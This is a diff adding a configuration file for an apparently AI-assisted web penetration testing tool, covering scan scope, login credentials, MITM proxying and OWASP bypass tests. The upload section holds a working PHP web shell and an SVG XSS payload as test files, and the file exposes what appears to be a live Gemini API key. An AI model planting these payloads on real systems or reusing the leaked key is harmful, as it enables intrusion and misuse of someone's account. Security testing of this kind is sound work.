@@ -1,0 +1,206 @@
+# Jarwis AGI Pen Test Configuration
+# Copy this file to config.local.yaml and fill in your values
+
+# Target Configuration
+target:
+  url: "https://example.com"  # Target website URL
+  scope:
+    include:
+      - "https://example.com/*"
+    exclude:
+      - "https://example.com/logout"
+      - "https://example.com/api/health"
+
+# Authentication
+auth:
+  enabled: true
+  type: "form"  # form, basic, bearer, oauth2
+  credentials:
+    username: "testuser"
+    password: "testpass"
+  login_url: "/login"
+  selectors:
+    username_field: "#username"
+    password_field: "#password"
+    submit_button: "#login-btn"
+  success_indicator: "/dashboard"  # URL or element that indicates successful login
+
+# Proxy Settings
+proxy:
+  host: "127.0.0.1"  # Proxy host (leave empty to disable)
+  port: 8080   # Proxy port (set to 0 for direct connection)
+  intercept: true
+  log_requests: true
+  
+  # MITM Proxy for HTTPS Interception
+  mitm:
+    enabled: false  # Enable full HTTPS traffic interception via MITM proxy
+    port: 8080      # MITM proxy port
+    # CA certificate will be auto-generated at ~/.jarwis/certs/mitmproxy-ca-cert.pem
+    # For full HTTPS interception, install the CA cert in your system/browser trust store
+
+# AI/LLM Configuration
+ai:
+  provider: "gemini"  # openai, gemini (google)
+  model: "gemini-2.5-flash"  # Suru 1.1 - Fast model for Pro users
+  model_thinking: "gemini-2.5-pro"  # Savi 3.1 Thinking - Deep analysis for Enterprise
+  api_key: "AIzaSyASpuSZ63PvdhjtousXDHDf8EEyiK51ZAU"  # Gemini API Key
+  max_tokens: 4096
+  temperature: 0.3
+  
+  # AI-Powered Security Features
+  request_analysis: true   # AI watches all HTTP traffic and suggests attack vectors
+  verify_findings: true    # AI verifies findings to reduce false positives
+  chatbot_enabled: true    # Enable Jarwis AGI Chatbot in frontend
+
+# Attack Configuration
+attacks:
+  rate_limit: 10  # Requests per second
+  timeout: 30     # Seconds
+  threads: 5
+  
+  # JavaScript Rendering - Essential for modern web applications
+  # When enabled, Jarwis uses a real browser to render JavaScript
+  # This helps detect vulnerabilities in SPAs, React, Angular, Vue apps
+  js_rendering: true  # Use browser for JavaScript-rendered content
+  
+  # OWASP Top 10 Categories
+  owasp:
+    injection:
+      enabled: true
+      sqlmap_level: 2
+      sqlmap_risk: 2
+    broken_auth:
+      enabled: true
+    sensitive_data:
+      enabled: true
+      patterns:
+        - "credit.?card"
+        - "\\b\\d{16}\\b"
+        - "password"
+        - "api.?key"
+        - "secret"
+    xxe:
+      enabled: true
+    broken_access:
+      enabled: true
+    misconfig:
+      enabled: true
+    xss:
+      enabled: true
+    deserialization:
+      enabled: true
+    components:
+      enabled: true
+    logging:
+      enabled: false  # Manual review only
+    
+    # ========== Security Bypass Scanners ==========
+    # These test for bypass techniques based on common security implementations
+    
+    # A07:2021 - Authentication Bypass Testing
+    auth_bypass:
+      enabled: true
+      # Tests: JWT alg:none, weak secrets, header bypass, default creds, MFA bypass
+    
+    # A07:2021 - Session Security Testing  
+    session_security:
+      enabled: true
+      # Tests: Cookie flags, token entropy, session fixation, timeout issues
+    
+    # A07:2021 - Rate Limit Bypass Testing
+    rate_limit_bypass:
+      enabled: true
+      # Tests: IP header rotation, parameter pollution, race conditions
+    
+    # A07:2021 - OAuth/SSO Security Testing
+    oauth_security:
+      enabled: true
+      # Tests: State parameter, redirect_uri bypass, PKCE, token exposure
+    
+    # A07:2021 - CAPTCHA Bypass Testing
+    captcha_bypass:
+      enabled: true
+      # Tests: Missing CAPTCHA, token reuse, client-side only validation
+    
+    # OWASP Mobile Top 10 - Mobile Backend Security
+    mobile_security:
+      enabled: true
+      # Tests: SSL/TLS config, device binding, root detection bypass
+    
+    # A07:2021 - Response Manipulation Testing (MITM Attacks)
+    response_manipulation:
+      enabled: true
+      # Tests: Token binding, response pattern analysis, login/OTP bypass via MITM
+      # This scanner detects if responses can be swapped to bypass authentication
+      # Attack: Capture success response Ã¢â€ â€™ Login with wrong password Ã¢â€ â€™ Replace failed response
+    
+    # A07:2021 - Response Swap Attack Testing (Comprehensive)
+    # IMPORTANT: This scanner requires test credentials for full testing
+    # Without credentials, only passive analysis is performed
+    response_swap:
+      enabled: true
+      # Full test requires: auth.username, auth.password configured
+      # Optional: auth.test_account_2 for cross-user token testing
+      # 
+      # Tests performed:
+      # 1. Token-to-user binding (is JWT bound to the user who authenticated?)
+      # 2. Cross-user token test (can User A's token access User B's data?)
+      # 3. Token modification attacks (alg:none, payload tampering)
+      # 4. Post-logout token validity (is token blacklisted after logout?)
+      # 5. OTP bypass via response swap (can MFA be bypassed?)
+      #
+      # The REAL vulnerability:
+      # - VULNERABLE: After swap, victim sees WRONG user's data
+      # - NOT VULNERABLE: After swap, victim sees the token owner's data
+
+# File Upload Testing
+upload:
+  enabled: true
+  max_size_mb: 10
+  test_extensions:
+    - ".php"
+    - ".php5"
+    - ".phtml"
+    - ".asp"
+    - ".aspx"
+    - ".jsp"
+    - ".svg"
+  test_files:
+    - name: "shell.php"
+      content: "GIF89a; <?php system($_GET['c']); ?>"
+    - name: "xss.svg"
+      content: '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'
+
+# API Testing
+api:
+  discover_swagger: true
+  swagger_paths:
+    - "/swagger.json"
+    - "/api/swagger.json"
+    - "/openapi.json"
+    - "/api-docs"
+    - "/v1/swagger.json"
+    - "/v2/swagger.json"
+  graphql_paths:
+    - "/graphql"
+    - "/api/graphql"
+  test_rate_limit: true
+  test_auth_bypass: true
+
+# Reporting
+reporting:
+  format:
+    - "sarif"
+    - "html"
+    - "json"
+  output_dir: "./reports"
+  include_evidence: true
+  severity_threshold: "low"  # low, medium, high, critical
+
+# Tool Paths (auto-detected if not specified)
+tools:
+  zap_path: ""
+  sqlmap_path: ""
+  nuclei_path: ""
+  ffuf_path: ""
